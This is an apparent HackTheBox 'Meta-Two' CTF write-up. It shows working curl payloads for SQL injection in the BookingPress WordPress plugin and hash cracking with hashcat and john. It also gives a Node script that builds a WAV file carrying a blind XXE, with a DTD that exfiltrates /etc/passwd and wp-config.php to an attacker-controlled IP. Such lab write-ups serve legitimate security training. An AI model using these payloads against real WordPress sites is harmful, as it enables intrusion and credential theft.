# HackTheBox Meta-Two

## NMAP

```
Nmap scan report for metapress.htb (10.10.11.186)                                                                                                                                                                        
Host is up (0.13s latency).
Not shown: 947 filtered tcp ports (no-response)
PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp              ProFTPD
22/tcp    open   ssh              OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:       
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp    open   http             nginx 1.18.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/         
|_http-generator: WordPress 5.6.2
|_http-title: MetaPress &#8211; Official company site
| http-cookie-flags: 
|   /:                
|     PHPSESSID:           
|_      httponly flag not set
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods:                
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0

```

## PORT 80

Visting the webserver, it redirects to `metapress.htb`

<img src="https://i.imgur.com/If1wETt.png"/>

Adding the domain name in `/etc/hosts` file

<img src="https://i.imgur.com/Y6Rc9v4.png"/>

<img src="https://i.imgur.com/D1wYbZp.png"/>

From wappalyzer, it seems that it's using wordpress version 5.6.2

<img src="https://i.imgur.com/Fhnf0Q2.png"/>

So running `wpscan` against the url 

```bash
wpscan --url http://metapress.htb/
```

<img src="https://i.imgur.com/3JszivN.png"/>

<img src="https://i.imgur.com/CZPSyoY.png"/>

It only returned the version which we already knew but didn't found any plugins, searching for CVEs related to wordpress, it shows sql injection via WP_QUERY in wordpress version till 5.8.2 which means this version might be vulnerable as well but it didn't worked

<img src="https://i.imgur.com/ZUlqEkg.png"/>

There was another CVE specifically for this version but it was an authenticated XXE so probably we'll need to login

<img src="https://i.imgur.com/SLeDDHo.png"/>
Enumerating site by going to `/events` and viewing the source, will show a plugin named `booking press` being used, not sure why wpscan didn't find it

<img src="https://i.imgur.com/eGjMgAv.png"/>

<img src="https://i.imgur.com/Xm3iata.png"/>

And this plugin has an un aunthenticated sql injection exploit

<img src="https://i.imgur.com/fwVuE7B.png"/>
We just only need the nonce which we can get the from view source

<img src="https://i.imgur.com/9OFJTOY.png"/>

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=ef5a981727&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

<img src="https://i.imgur.com/jW0BhaP.png"/>

We can manully dump the data by first enumerating the table names

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=0fa9f4afbd&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(table_name),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from information_schema.tables where table_schema=database()-- -' 
```

<img src="https://i.imgur.com/telx3ew.png"/>

## Foothold

Now we need to get the column names for `wp_users` because that's the table where wordpress saves user credentials but when I tried dumping the column names for some reason it wasn't working 

```bash
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=0fa9f4afbd&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(column_name),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from information_schema.columns where table_name=wp_users-- -'
```

<img src="https://i.imgur.com/5ajDMyP.png"/>

But we don't have to worry about getting column names as it's wordpress so we can google for columns for wp_users table

<img src="https://i.imgur.com/jzFE2NZ.png"/>

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=0fa9f4afbd&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login,user_pass),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' 
```

<img src="https://i.imgur.com/ffciQHu.png"/>

Cracking the hashes with `hashcat`, we'll get manager's hash cracked with the password `partylikearockstar`

```bash
hashcat -a 0 -m 400 ./hash.txt /usr/share/wordlists/rockyou.txt --force
```

<img src="https://i.imgur.com/Fzf4Noz.png"/>

<img src="https://i.imgur.com/zJiBNTL.png"/>

<img src="https://i.imgur.com/GC4rTuv.png"/>

With these credentials we can login into the dashboard of wordpress but there's nothing much we could do with this user

<img src="https://i.imgur.com/JnJbrMJ.png"/>

Looking back at the authenticated XXE, we can try that 

<img src="https://i.imgur.com/hIZ80M3.png"/>

We need to generate a malicious wav file which will perform an out of band or blind XXE attack by fetching the dtd from our server which is going to read the `/etc/passwd` file and present the output to us

```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.13:2222/?p=%file;'>" >

```

```js
const fs = require('fs');
const wavefile = require('wavefile');

let wav = new wavefile.WaveFile();
wav.fromScratch(1, 44100, '32', [0, -2147483, 2147483, 4]);
wav.setiXML('<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \'http://10.10.14.13:2222/uwu.dtd\'>%remote;%init;%trick;]>');
fs.writeFileSync('malicious.wav', wav.toBuffer());

```

Before running the script, make sure install `wavefile` npm package with `npm -i wavefile`

<img src="https://i.imgur.com/1t6wSAR.png"/>

Simply upload the `malicious.wav` file through `Media Library` option and check the listener

<img src="https://i.imgur.com/ivpYnAH.png"/>
Decoding the base64 file contents we'll get /etc/password from the target machine

<img src="https://i.imgur.com/LH3qZIx.png"/>

Now reading `wp-config.php` which should one directory back 

```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.13:2222/?p=%file;'>" >
```

<img src="https://i.imgur.com/61OheCg.png"/>

With these credentials we can login to ftp

<img src="https://i.imgur.com/T62Nwkr.png"/>

By going into `mailer` directoy, there's `send_mail.php` from where we can find jnelson's password and login through ssh

<img src="https://i.imgur.com/wpY1nxO.png"/>

Running `sudo -l` we see that this user isn't in sudeors group

<img src="https://i.imgur.com/HMLuU5m.png"/>

## Privilege Escalation

Checking the files which are owned by jnelson group, we see few files related to `passpie`  which is a command line manager

<img src="https://i.imgur.com/QihBmY9.png"/>

Here we'll see the pgp message that is encrypted

<img src="https://i.imgur.com/oFI5OYF.png"/>


We'll also find the pgp private key from `/home/.passpie/keys`

<img src="https://i.imgur.com/XEhEINp.png"/>

To crack the pgp message we need to know the password of the private key so that we can import it and do that we can use `gpg2john`

```bash
 /usr/sbin/gpg2john ./private.key >  private_hash 
```

<img src="https://i.imgur.com/l9ZGghT.png"/>

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt private_hash
```

<img src="https://i.imgur.com/I0BVDAX.png"/>

With the password `blink182` we can import the private key

<img src="https://i.imgur.com/Izu3GdE.png"/>

<img src="https://i.imgur.com/NQPscIP.png"/>

Which might be the password for root user, so switching to root user

<img src="https://i.imgur.com/GLzP0yD.png"/>

We can export passwords from passpie as well with `export` option by specifying the private key password and the path where we want to save the file 

<img src="https://i.imgur.com/AI2yc8c.png"/>

## References


- https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
- https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
- https://wpscan.com/wordpress/562
- https://codex.wordpress.org/Database_Description

